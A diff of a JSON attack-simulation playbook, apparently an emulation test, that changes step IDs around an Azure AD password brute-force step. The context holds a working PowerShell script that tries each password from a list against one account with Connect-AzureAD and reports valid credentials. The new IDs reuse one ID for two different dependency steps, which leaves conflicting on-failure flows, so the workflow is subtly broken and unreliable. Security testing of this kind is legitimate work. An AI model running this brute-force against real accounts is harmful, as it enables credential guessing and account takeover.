@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "44ba2dab-d5e7-4fa4-a2c1-bd112cce1bf2",
+      "id": "055538fe-4bf7-503f-bdf0-28a74172e6f0",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2\u003e\u00261\u003e $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "b5f973bf-1338-4487-8f58-d8eb6c76fe5f",
+      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "f698300d-4d4e-4090-be66-36e36fb753b1",
+      "id": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "b6303ede-c633-4d01-a6e9-50dab789387b",
+      "id": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "b5f973bf-1338-4487-8f58-d8eb6c76fe5f",
+      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "p": "on-success",
-      "o": "44ba2dab-d5e7-4fa4-a2c1-bd112cce1bf2"
+      "o": "055538fe-4bf7-503f-bdf0-28a74172e6f0"
     },
     {
-      "s": "b5f973bf-1338-4487-8f58-d8eb6c76fe5f",
+      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "p": "on-failure",
-      "o": "f698300d-4d4e-4090-be66-36e36fb753b1"
+      "o": "1fa9d886-4e7b-5fde-9622-fecd2533f775"
     },
     {
-      "s": "f698300d-4d4e-4090-be66-36e36fb753b1",
+      "s": "1fa9d886-4e7b-5fde-9622-fecd2533f775",
       "p": "on-success",
-      "o": "b6303ede-c633-4d01-a6e9-50dab789387b"
+      "o": "653fec79-d5a5-51b2-adcd-921a50cf09f5"
     },
     {
-      "s": "b6303ede-c633-4d01-a6e9-50dab789387b",
+      "s": "653fec79-d5a5-51b2-adcd-921a50cf09f5",
       "p": "on-failure",
-      "o": "44ba2dab-d5e7-4fa4-a2c1-bd112cce1bf2"
+      "o": "055538fe-4bf7-503f-bdf0-28a74172e6f0"
     }
   ],
   "tags": [
